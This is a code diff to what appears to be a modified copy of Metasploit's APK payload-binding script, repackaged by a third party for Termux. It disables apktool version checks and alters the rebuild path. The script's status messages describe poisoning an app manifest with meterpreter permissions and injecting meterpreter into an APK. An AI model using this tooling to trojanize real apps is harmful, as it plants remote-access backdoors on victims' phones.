@@ -149,15 +149,15 @@ class Msf::Payload::Apk
 
     #zipalign = run_cmd("zipalign")unless zipalign != nilraise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."en
 
-    apktool = run_cmd("apktool -version")
-    unless apktool != nil
-      raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
-    end
+    #apktool = run_cmd("apktool -version")
+    #unless apktool != nil
+      #raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
+    #end
 
-    apk_v = Gem::Version.new(apktool)
-    unless apk_v >= Gem::Version.new('2.0.1')
-      raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
-    end
+   # apk_v = Gem::Version.new(apktool)
+  #  unless apk_v >= Gem::Version.new('2.0.1')
+  #    raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
+  #  end
 
     #Create temporary directory where work will be done
     tempdir = Dir.mktmpdir
@@ -241,9 +241,9 @@ class Msf::Payload::Apk
     print_status "Poisoning the manifest with meterpreter permissions..\n"
     fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
 
-    print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk} and yes it's me guys...your friend Lokesh (devil) thanx for using my tool TMUX-BUNCH V-2.3\n"
+    print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk} and yes it's me guys...your friend Lokesh (devil) thanx for using my tool TMUX-BUNCH V-2.5\n"
 print_status "Note :- Tmux-Bunch is my tool but this apk.rb script is written by Metasploit team and I am just a modifier of this script for binding payload in termux"
-    run_cmd("apktool b --aapt $HOME/Tmux-Bunch/.bunch/openjdk/bin/aapt -o #{injected_apk} #{tempdir}/original")
+    run_cmd("apktool b --aapt $HOME/Tmux-Bunch/.bunch/aapt -o #{injected_apk} #{tempdir}/original")
     unless File.readable?(injected_apk)
       raise RuntimeError, "Unable to rebuild apk with apktool"
     end
